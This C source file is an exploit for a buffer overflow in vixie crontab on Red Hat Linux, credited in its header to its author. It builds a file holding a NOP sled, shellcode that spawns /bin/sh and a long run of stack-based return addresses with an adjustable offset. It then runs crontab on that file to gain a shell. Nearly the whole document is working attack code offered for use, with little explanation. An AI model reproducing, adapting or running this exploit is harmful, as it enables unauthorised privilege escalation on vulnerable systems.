/* vixie crontab buffer overflow for RedHat Linux
 *
 * I dont think too many people know that redhat uses vixie crontab.
 * I didn't find this, just exploited it.
 *
 *
 * Dave G.
 * <daveg@escape.com>
 * http://www.escape.com/~daveg
 *
 *
 */

#include <stdio.h>
#include <sys/types.h>
#include <stdlib.h>
#include <fcntl.h>
#include <unistd.h>

#define DEFAULT_OFFSET          -1240
#define BUFFER_SIZE             100     /* MAX_TEMPSTR is 100 */
#define HAPPY_FILE              "./Window"

long get_esp(void)
{
   __asm__("movl %esp,%eax\n");
}

main(int argc, char **argv)
{
   int fd;
   char *buff = NULL;
   unsigned long *addr_ptr = NULL;
   char *ptr = NULL;
  u_char execshell[] =
   "\xeb\x24\x5e\x8d\x1e\x89\x5e\x0b\x33\xd2\x89\x56\x07\x89\x56\x0f"
   "\xb8\x1b\x56\x34\x12\x35\x10\x56\x34\x12\x8d\x4e\x0b\x8b\xd1\xcd"
   "\x80\x33\xc0\x40\xcd\x80\xe8\xd7\xff\xff\xff/bin/sh";



/*
 * The sscanf line reads for 'name' as %[^ =].  Neither a space, nor
 * a '=' character appears below
 */


   int i;
   int ofs = DEFAULT_OFFSET;

   /* if we have a argument, use it as offset, else use default */
   if(argc == 2)
      ofs = atoi(argv[1]);
   else if (argc > 2) {
      fprintf(stderr, "egg [offset]\n");
      exit(-1);
   }
   /* print the offset in use */
   printf("Using offset of esp + %d (%x)\n", ofs, get_esp()+ofs);

   buff = malloc(4096);
   if(!buff)
   {
      printf("can't allocate memory\n");
      exit(0);
   }
   ptr = buff;
   /* fill start of buffer with nops */
   memset(ptr, 0x90, BUFFER_SIZE-strlen(execshell));
   ptr += BUFFER_SIZE-strlen(execshell);
   /* stick asm code into the buffer */
   for(i=0;i < strlen(execshell);i++)
      *(ptr++) = execshell[i];

   addr_ptr = (long *)ptr;
   for(i=0;i < (878/4);i++)
      *(addr_ptr++) = get_esp() + ofs;
   ptr = (char *)addr_ptr;
   *ptr++ = '=';
   *ptr++ = 'X';
   *ptr++ = '\n';
   *ptr = 0;
   printf("Writing to %s\n", HAPPY_FILE);

   fd = open(HAPPY_FILE, O_WRONLY|O_CREAT, 0666);
   write (fd, buff, strlen(buff));

   close(fd);

   execl("/usr/bin/crontab","crontab",HAPPY_FILE,NULL);
   /* Successful completion */
   exit(0);
}

